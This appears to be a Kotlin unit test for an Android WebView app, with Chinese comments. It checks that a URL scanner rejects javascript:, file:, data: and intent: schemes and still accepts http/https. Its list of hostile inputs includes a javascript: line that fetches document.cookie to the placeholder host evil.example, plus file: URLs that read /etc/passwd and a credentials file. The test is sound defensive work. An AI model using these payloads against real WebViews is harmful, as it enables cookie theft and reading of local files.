package com.dsh

import com.dsh.core.UrlScanner
import org.junit.Test
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull

/**
 * round32 / N3（`verify-238`）：`UrlScanner` 采信的 URL 会被送进 `webView.loadUrl`，
 * 所以必须限定 scheme。
 *
 * ## 缺陷
 * `MARKER_URL` 是 `(?i)READY\s+url=(\S+)` —— 只要求"非空白"。于是造这样的行：
 *
 * ```
 * READY url=javascript:alert(1)//?token=x
 * ```
 *
 * `findMarkerUrl` 会原样返回它，`onProcessLine` 把结果写进 `_state.url`，
 * `loadUrlChecked` 再交给 `webView.loadUrl` ⇒ **脚本在同源上下文里执行**。
 * 同理还有 `file:///`（读 rootfs 内任意文件）、`data:`（渲染任意内容）、
 * `intent://`（交给系统解析、可外跳任意组件）。
 *
 * 这四种形态我都用 JDK 实跑过原正则确认命中（见 `N3-redteam.md` 的实测记录）。
 *
 * ## 为什么是白名单
 * `loadUrl` 接受的 scheme 随 WebView 版本变化，黑名单必然漏。只放行 http/https。
 *
 * ## 与 host 门的分工
 * 本文件只管 **scheme**。`https://evil.example:443/?token=x` 会通过这里 ——
 * host 门由 `onProcessLine` 的调用方负责，两件事分开测，避免"一个门掩盖另一个门"。
 */
class R32N3UrlSchemeGateTest {

    // ---------------------------------------------------------- findMarkerUrl

    /**
     * **缺陷本体**：script/file/data/intent 四种 scheme 都不得被采信。
     *
     * 判别力：去掉 `hasRenderableScheme` 后，这四条全部变红（各自返回非 null）。
     */
    @Test
    fun markerUrlRejectsNonRenderableSchemes() {
        val hostile = listOf(
            // javascript: 会在 loadUrl 时执行；加 //?token=x 是为了让"带 token"这条伪装成立
            "READY url=javascript:alert(document.cookie)//?token=x",
            "READY url=javascript:fetch('http://evil.example/'+document.cookie)",
            "READY url=file:///root/home/.credentials.yaml",
            "READY url=file:///etc/passwd",
            "READY url=data:text/html,<script>alert(1)</script>",
            "READY url=intent://evil.example#Intent;component=com.evil/.Steal;end",
            // 大小写变形：白名单必须大小写不敏感地判"前缀不属于 http(s)"
            "READY url=JavaScript:alert(1)",
            "READY url=FILE:///root/x"
        )
        for (line in hostile) {
            assertNull(
                "非 http(s) 的 scheme 不得被采信（会被送进 webView.loadUrl）：$line",
                UrlScanner.findMarkerUrl(line)
            )
        }
    }

    /** 正常路径必须**完全不受影响** —— 这一条防止"门加了但把真 URL 也拦了"。 */
    @Test
    fun markerUrlStillAcceptsHttpAndHttps() {
        val ok = listOf(
            "[start-dsh] READY url=http://127.0.0.1:40233/?token=et5w4-xSCJpP95w98yyXZOJOxkn",
            "[start-dsh] READY url=https://127.0.0.1:40233/?token=abc",
            // 大小写：http 前缀大小写不敏感
            "[start-dsh] READY url=HTTP://127.0.0.1:3080/?token=x",
            "[start-dsh] READY url=Http://127.0.0.1:3080/"
        )
        for (line in ok) {
            assertNotNull("http/https 必须照旧采信：$line", UrlScanner.findMarkerUrl(line))
        }
        // 逐字断言一条，确保返回值没有被 trim/改写之外的加工
        assertEquals(
            "http://127.0.0.1:40233/?token=et5w4-xSCJpP95w98yyXZOJOxkn",
            UrlScanner.findMarkerUrl(
                "[start-dsh] READY url=http://127.0.0.1:40233/?token=et5w4-xSCJpP95w98yyXZOJOxkn"
            )
        )
    }

    /**
     * 既有契约**不得被 scheme 门破坏**：`READY port=3080` 仍不命中 `findMarkerUrl`。
     *
     * 这条本来在 `DshCoreLogicTest` 里，这里再钉一次是因为我改的正是这个方法 ——
     * 如果我顺手写成"先抓 \S+ 再判前缀"，`port=3080` 会被当成相对 URL 而仍有非空返回值。
     */
    @Test
    fun markerUrlStillIgnoresPortOnlyLine() {
        assertNull(
            "READY port= 行不得被 findMarkerUrl 命中（BL-109 的分工契约）",
            UrlScanner.findMarkerUrl("[start-dsh] READY port=3080")
        )
    }

    // -------------------------------------------------- findAuthenticatedUrl

    /**
     * `AUTH_URL` 自带 `https?://` 前缀，本来就不会命中 script/file/data。
     * 这条钉住"加了门之后行为不变"，同时确认 `https` 也被接受
     * （host 门才是拦 `https://evil.example` 的那道，不在这里）。
     */
    @Test
    fun authenticatedUrlAcceptsBothHttpAndHttps() {
        assertEquals(
            "http://127.0.0.1:3080/?token=abc",
            UrlScanner.findAuthenticatedUrl("dsh web: http://127.0.0.1:3080/?token=abc")
        )
        assertEquals(
            "https://evil.example:443/?token=x",
            UrlScanner.findAuthenticatedUrl("dsh web: https://evil.example:443/?token=x")
        )
    }

    /** 不带 scheme 的伪 URL 不得被 `AUTH_URL` 命中（回归：正则没被放松）。 */
    @Test
    fun authenticatedUrlRequiresScheme() {
        assertNull(
            "没有 scheme 的串不得命中",
            UrlScanner.findAuthenticatedUrl("dsh web: 127.0.0.1:3080/?token=abc")
        )
        assertNull(
            "javascript: 不得命中 findAuthenticatedUrl",
            UrlScanner.findAuthenticatedUrl("dsh web: javascript:alert(1)//?token=x")
        )
    }
}
